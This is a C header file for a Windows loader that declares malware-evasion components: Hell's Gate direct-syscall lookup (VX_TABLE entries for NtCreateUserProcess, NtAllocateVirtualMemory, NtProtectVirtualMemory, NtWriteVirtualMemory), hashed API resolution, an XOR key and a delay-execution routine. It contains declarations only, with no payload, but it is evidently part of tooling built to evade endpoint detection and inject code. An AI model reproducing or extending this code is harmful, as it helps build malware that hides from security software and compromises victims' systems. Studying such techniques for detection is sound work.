#pragma once

#include <Windows.h>

#ifndef COMMON_H
#define COMMON_H

#include "typedef.h"
#include "Structs.h"
#include "Common.h"
#include <stdio.h>

#define PRINTA( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );           \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  

//--------------------------------------------------------------------------------------------------------------------------
// from WinApi.c

// seed of the HashStringJenkinsOneAtATime32BitA/W funtion in 'WinApi.c'
#define INITIAL_SEED	8
#define XOR_KEY 0x69

UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);

#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))

CHAR _toUpper(CHAR C);
PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size);

//--------------------------------------------------------------------------------------------------------------------------
// from ApiHashing.c

/*
	Api Hashing functions
*/
FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash);
HMODULE GetModuleHandleH(DWORD dwModuleNameHash);

//--------------------------------------------------------------------------------------------------------------------------
// from HellsGate.c

typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	UINT32	uHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;


BOOL DelayExecution(FLOAT ftMinutes);
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(_In_ PVOID pModuleBase, _Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);
BOOL GetVxTableEntry(_In_ PVOID pModuleBase, _In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, _In_ PVX_TABLE_ENTRY pVxTableEntry);


extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();

// used to fetch the addresses of the syscalls / WinAPIs used
BOOL InitSysCalls();

// structure that will be used to save the WinAPIs addresses
typedef struct _API_HASHING {

	fnGetTickCount64				pGetTickCount64;
	fnRtlCreateProcessParametersEx pRtlCreateProcessParametersEx;

}API_HASHING, * PAPI_HASHING;

// structure that will be used to save the Syscalls Information (ssn - hash - address)
typedef struct _VX_TABLE {

	VX_TABLE_ENTRY NtCreateUserProcess;
    VX_TABLE_ENTRY NtAllocateVirtualMemory;
    VX_TABLE_ENTRY NtProtectVirtualMemory;
    VX_TABLE_ENTRY NtWriteVirtualMemory;

} VX_TABLE, * PVX_TABLE;

#endif // !COMMON_H
